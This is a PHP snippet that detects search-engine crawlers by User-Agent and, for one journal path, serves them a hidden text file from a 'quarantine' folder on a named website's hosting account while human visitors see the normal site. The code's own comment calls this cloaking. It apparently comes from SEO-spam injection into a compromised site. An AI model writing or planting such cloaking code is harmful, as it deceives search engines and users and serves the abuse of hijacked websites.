function is_bot() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $bots = ['Googlebot', 'Google-InspectionTool', 'Bingbot', 'Slurp', 'DuckDuckBot', 'AhrefsBot'];
    foreach ($bots as $bot) {
        if (stripos($ua, $bot) !== false) return true;
    }
    return false;
}

$uri = $_SERVER['REQUEST_URI'] ?? '';

// Cloaking /journals/jopp untuk bot
if (is_bot() && strpos($uri, '/journals/jopp') !== false) {
    $file = '/home/u457839213/domains/ukinstitute.org/public_html/quarantine/jopp.txt';
    if (file_exists($file)) {
        header('Content-Type: text/plain');
        readfile($file);
    } else {
        echo 'cache not ready';
    }
    exit;
}
